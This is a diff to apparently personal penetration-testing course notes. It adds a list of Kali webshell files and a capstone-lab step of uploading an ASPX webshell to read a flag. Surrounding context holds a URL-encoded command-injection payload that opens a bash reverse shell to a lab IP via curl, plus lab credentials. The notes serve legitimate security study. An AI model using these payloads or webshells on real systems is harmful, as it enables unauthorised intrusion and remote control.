@@ -59,6 +59,10 @@
   - Credentials (🔒 username:Eric.Wallows, password:EricLikesRunning800)
   - Flag format: `OS{68c1a60008e872f3b525407de04e48a3}`
   - Find flag: `find / -name "flag.txt" 2>/dev/null`
+  - webshell (asp, aspx, cfm, jsp, laudanum, perl, php)
+    - aspx: /usr/share/webshells/aspx/cmdasp.aspx
+    - php: simple-backdoor.php (cmd)
+    - php: php-reverse-shell.php (reverse web shell)
 
 ## Methodology 
 
@@ -716,7 +720,10 @@
     Before encode: "&&bash -c 'bash -i >& /dev/tcp/192.168.45.170/4444 0>&1'"  
     Note: closes a previous string with ", then uses && to run a bash reverse shell connecting back to 192.168.45.170 on port 4444  
     `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa=%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.170/4444+0>%261'%22"`  
-- **Capstone lab**:
+- **Capstone lab**: aspx webshell
+  upload file from /usr/share/webshells/aspx/cmdasp.aspx  
+  browse port 80 for uploaded shell: http://192.168.132.192/cmdasp.aspx  
+  type C:\inetpub\flag.txt  
 
 ### SQL injection attacks
 
